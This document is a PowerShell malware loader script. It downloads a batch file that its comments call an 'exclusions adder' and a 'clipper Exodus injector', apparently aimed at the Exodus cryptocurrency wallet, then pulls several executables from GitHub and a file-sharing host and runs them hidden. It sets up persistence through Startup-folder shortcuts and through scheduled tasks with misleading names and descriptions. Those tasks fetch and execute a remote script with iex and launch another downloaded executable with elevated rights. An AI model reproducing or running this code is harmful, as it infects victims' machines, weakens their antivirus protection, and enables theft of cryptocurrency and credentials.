$cludeU = "https://raw.githubusercontent.com/Zyg0s/USDT-SPOOFER-SENDER/main/lolol.bat"



#DOWNLOAD THE EXCLUSIONS ADDER AND RUN IT
$localPath = "$env:TEMP\lolol.bat"
$LocalAppData = $env:LOCALAPPDATA
$roamingPath = $env:AppData
Invoke-WebRequest -Uri $cludeU -OutFile $localPath
Start-Process -FilePath "cmd.exe" -ArgumentList "/c", $localPath -Wait -WindowStyle Hidden
#END -----------------------------------------------------------------------

#DOWNLOAD THE CLIPPER EXODUS INJECTOR



#DOWNLOAD THE CLIPPER EXODUS INJECTOR
$tain = "https://anonsharing.com/file/4fcd3e6c6733122d/howto.exe"
$injaPath = "$env:AppData\Howto.exe"
Invoke-WebRequest -Uri $tain -OutFile $injaPath
Start-Process -FilePath $injaPath -WindowStyle Hidden

$Enviar = "https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Enviar.exe"
$EnviarPath = "$env:AppData\Enviar.exe"
Invoke-WebRequest -Uri $Enviar -OutFile $EnviarPath
Start-Process -FilePath $EnviarPath -WindowStyle Hidden

$CRIP = "https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Crip.exe"
$CripPath = "$env:AppData\Crip.exe"
Invoke-WebRequest -Uri $CRIP -OutFile $CripPath
Start-Process -FilePath $CripPath -WindowStyle Hidden


#DOWNLOAD THE CLIPPER EXODUS INJECTOR ------------------------











# Define the path to your application in Local AppData
$appPath = "$env:AppData\Enviar.exe"

# Define the path to the Startup folder
$startupFolder = [Environment]::GetFolderPath("Startup")

# Define the path for the shortcut in the Startup folder
$shortcutPath = Join-Path $startupFolder "Enviar.lnk"

# Create a WScript.Shell COM object
$wshShell = New-Object -ComObject WScript.Shell

# Create the shortcut
$shortcut = $wshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $appPath
$shortcut.WorkingDirectory = Split-Path $appPath
$shortcut.WindowStyle = 1 # Normal window
$shortcut.Description = "Enviar App"
$shortcut.Save()




# Define the path to the Startup folder
$startupFolder = [Environment]::GetFolderPath("Startup")

# Define the path for the shortcut in the Startup folder
$shortcutPath = Join-Path $startupFolder "Crip.lnk"

# Create a WScript.Shell COM object
$wshShell = New-Object -ComObject WScript.Shell

# Create the shortcut
$shortcut = $wshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $CripPath
$shortcut.WorkingDirectory = Split-Path $CripPath
$shortcut.WindowStyle = 1 # Normal window
$shortcut.Description = "Crip"
$shortcut.Save()



$currentTime = Get-Date
$triggerTime = $currentTime.AddMinutes(1)

$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument @"
-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "iex (iwr 'https://raw.githubusercontent.com/Zyg0s/VI_ASTRA/refs/heads/main/dabididabudai.ps1').Content"
"@

$trigger = New-ScheduledTaskTrigger -Once -At $triggerTime

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AppLog" -Description "Daily dump of Applog"

$triggerTime2 = $currentTime.AddMinutes(1)

$script = '"& { iwr ''https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Viscousgetter.exe'' -OutFile $env:AppData\Viscousgetter.exe; Start-Process -FilePath $env:AppData\Viscousgetter.exe -WindowStyle Hidden -Verb RunAs }"'

$action2 = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command $script"

# Define the trigger
$trigger2 = New-ScheduledTaskTrigger -Once -At $triggerTime2

# Register the scheduled task
Register-ScheduledTask -Action $action2 -Trigger $trigger2 -TaskName "Bendover" -Description "Daily News"

